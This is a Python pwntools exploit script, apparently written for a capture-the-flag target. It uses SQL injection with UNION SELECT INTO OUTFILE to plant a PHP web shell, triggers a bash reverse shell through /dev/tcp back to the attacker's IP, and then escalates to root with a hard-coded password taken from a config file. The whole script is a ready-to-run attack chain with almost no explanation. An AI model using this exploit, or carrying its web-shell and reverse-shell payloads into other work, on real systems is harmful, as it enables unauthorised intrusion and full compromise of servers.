#!/usr/bin/python3

from pwn import * 
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#How to use the exploit?
if len(sys.argv) != 4:
    log.failure("Usage: %s <ip-address> filename <my_ip_address>" % sys.argv[0])
    sys.exit(1)

#Global variables
ip_address = sys.argv[1]
filename = sys.argv[2]
my_ip_address = sys.argv[3]
main_url = "http://%s/" % ip_address
lport = 4126

#pdb.set_trace() #Check ip address and filename
#Functions
#SQLi
def createFile():

    data_post = {
        'username': 'baduser',
        'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -'""" % (filename)
    }
    #pdb.set_trace() #check filename

    r = requests.post(main_url, data=data_post)
#Establish a reverse shell
def getAccess():
    
    data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/%s/4126 0>&1'" % (my_ip_address)
    }

    r = requests.post(main_url + "%s" % filename, data_post)

if __name__ == '__main__':
    
    createFile()
    try: 
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=15).wait_for_connection() 
    shell.sendline("su root")
    time.sleep(2)
    shell.sendline("uhc-9qual-global-pw") #The password stored in the config.php file. Press enter and done
    shell.interactive()
